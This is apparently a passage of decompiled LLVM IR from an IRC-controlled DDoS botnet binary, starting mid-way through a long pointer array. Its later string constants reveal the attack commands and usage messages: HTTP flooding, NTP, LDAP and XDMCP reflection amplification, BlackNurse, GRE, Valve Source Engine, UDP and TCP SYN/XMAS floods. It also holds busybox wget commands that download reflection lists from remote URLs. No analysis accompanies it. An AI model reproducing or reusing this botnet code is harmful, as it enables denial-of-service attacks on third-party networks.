i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_36770.253, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36778.254, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36780.255, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36790.256, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367b8.261, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_367c0.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367d8.265, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_36800.268, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36804.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3680c.270, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36814.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3683c.275, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36844.276, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36858.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3687c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_368b0.287, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368b8.288, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_36800.268, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c8.290, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d0.291, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367d8.265, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368e0.293, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368ec.294, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_368f8.295, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36858.278, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_368b0.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368ec.294, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36858.278, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36778.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36844.276, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3683c.275, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36904.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d0.291, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c8.290, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_36800.268, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368b8.288, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_368b0.287, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367d8.265, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3690c.298, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_367c0.262, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367b8.261, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36780.255, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36920.300, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36990.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36998.312, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3687c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_369a4.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368e0.293, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b0.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b8.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369c0.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369c8.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369d4.318, i32 0, i32 0)]
@global_var_37300.321 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_37320.324 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_373d8.326 = constant i32 704839703
@global_var_373e4.332 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_37454.334 = constant [171 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt || /var/run/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_37500.339 = constant [8 x i8] c"NTP.txt\00"
@global_var_37508.342 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_3752c.345 = constant i32 856490755
@global_var_37550.347 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_3757c.349 = constant [7 x i8] c"socket\00"
@global_var_37584.351 = constant [28 x i8] c"NOTICE %s :Blacknursing %s\0A\00"
@global_var_375a0.353 = constant [7 x i8] c"sendto\00"
@global_var_53714.355 = global i32 0
@global_var_536e4.357 = global i32 0
@global_var_375a8.359 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_525a4.361 = global i32 0
@global_var_536c8.363 = global i32 0
@global_var_536fc.365 = global i32 0
@global_var_375b4.367 = constant i32 11
@global_var_375b8.372 = constant [102 x i8] c"NOTICE %s :GRE <target IP> <port dest> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_d52c.376 = constant i32 -509558771
@global_var_37620.378 = constant [29 x i8] c"NOTICE %s :GRE ATTACKING %s\0A\00"
@global_var_37640.382 = constant [21 x i8] c"TSource Engine Query\00"
@global_var_37658.387 = constant [90 x i8] c"NOTICE %s :VSE <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_dea8.391 = constant i32 -509558771
@global_var_376b4.393 = constant [29 x i8] c"NOTICE %s :VSE ATTACKING %s\0A\00"
@global_var_376d4.397 = constant i32 33554688
@global_var_376dc.402 = constant [114 x i8] c"NOTICE %s :XMDCP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_37750.404 = constant [166 x i8] c"wget \22%s\22 -q -O XM.txt || busybox wget \22%s\22 -O XM.txt || /bin/busybox wget \22%s\22 -O XM.txt || /usr/busybox wget \22%s\22 -O XM.txt || /var/run/busybox wget \22%s\22 -O XM.txt\00"
@global_var_377f8.409 = constant [7 x i8] c"XM.txt\00"
@global_var_e6b8.412 = constant i32 -509558771
@global_var_37800.414 = constant [32 x i8] c"NOTICE %s :XDMCP ATTACKING: %s\0A\00"
@global_var_37820.418 = constant i32 33840
@global_var_37854.423 = constant [113 x i8] c"NOTICE %s :LDAP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_378c8.425 = constant [176 x i8] c"wget \22%s\22 -q -O LDAP.txt || busybox wget \22%s\22 -O LDAP.txt || /bin/busybox wget \22%s\22 -O LDAP.txt || /usr/busybox wget \22%s\22 -O LDAP.txt || /var/run/busybox wget \22%s\22 -O LDAP.txt\00"
@global_var_37978.430 = constant [9 x i8] c"LDAP.txt\00"
@global_var_f2d0.433 = constant i32 -509558771
@global_var_37984.435 = constant [31 x i8] c"NOTICE %s :LDAP ATTACKING: %s\0A\00"
@global_var_379a4.438 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_379cc.440 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_379e8.442 = constant i32 2
@global_var_37a38.444 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_37a60.446 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_37af4.448 = constant i32 2
@global_var_37a78.450 = constant i32 21
@global_var_37b44.452 = constant [45 x i8] c"NOTICE %s :GIGATCP <target> <method> <secs>\0A\00"
@global_var_37b74.454 = constant [65 x i8] c"NOTICE %s :GIGA-TCP Flooding %s using the ' %s ' method Request\0A\00"
@global_var_37bb8.456 = constant [4 x i8] c"all\00"
@global_var_37bbc.458 = constant [5 x i8] c"xmas\00"
@global_var_37bc4.460 = constant [5 x i8] c"usyn\00"
@global_var_37bcc.462 = constant [7 x i8] c"GigAck\00"
@global_var_37bd4.464 = constant [8 x i8] c"GigaSyn\00"
@global_var_37bdc.466 = constant i32 44
@global_var_37be0.468 = constant [4 x i8] c"syn\00"
